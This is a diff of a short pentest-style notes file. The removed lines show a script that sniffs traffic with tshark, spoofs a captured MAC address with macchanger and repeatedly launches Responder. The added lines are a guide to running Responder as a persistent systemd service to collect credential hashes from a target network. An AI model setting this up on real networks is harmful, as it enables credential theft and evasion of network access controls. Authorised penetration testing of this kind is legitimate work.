@@ -1,42 +1,19 @@
-start_resp.sh
+# Run anything in background as a service (Linux)
 
-# Reset MAC Address Random
-#sudo ifconfig eth1 hw ether $(ethtool -P eth1 | awk '{print $3}') 1>&-
+(Example: Run Responder (https://github.com/camopants/igandx-Responder) as a Service to collect hashes)
 
-while true;do
-echo "[+] Capturando MAC Address, aguarde 10 segundos..."
+## Create service file:
 
-echo "" > /tmp/captured_mac.txt
+/etc/systemd/system/responder.service
 
-sudo tshark -i eth1 -Y "_ws.col.protocol matches \"IGMPv3\"" -T fields -e eth.src -a duration:10 2>&- | sort -u > /tmp/captured_mac.txt
-echo "64:1c:67:e6:d8:a0" > /tmp/captured_mac.txt
-# Caminho do arquivo de onde ler o valor
-arquivo="/tmp/captured_mac.txt"
-valor=$(cat "$arquivo" | tr -d '[:space:]')
-# Executa o comando macchanger com o valor lido do arquivo
-sudo macchanger -m "$valor" eth1 2>&- # Substitua "eth1" pela interface de rede desejada
-
-cd /usr/share/responder
-sudo python3 automation.py
-done
-
-
-
-resp-onder.sh
-cd /usr/share/responder
-sudo python3 /usr/share/responder/automation.py
-
-
-
-
-
+## Content:
 
 [Unit]
 Description=Responder Service
 After=network.target
 
 [Service]
-ExecStart=/usr/bin/python3 /usr/share/responder/Responder.py -I eth1 -Q
+ExecStart=/usr/bin/python3 /usr/share/responder/Responder.py -I wlan0 -Q
 WorkingDirectory=/usr/share/responder
 StandardOutput=syslog
 StandardError=syslog
@@ -45,3 +22,12 @@ RestartSec=3
 
 [Install]
 WantedBy=multi-user.target
+
+## 
+
+sudo systemctl enable responder
+
+sudo service responder start 
+
+* If change enything in file, run: sudo systemctl daemon-reload
+* Change network interface wlan0 to target
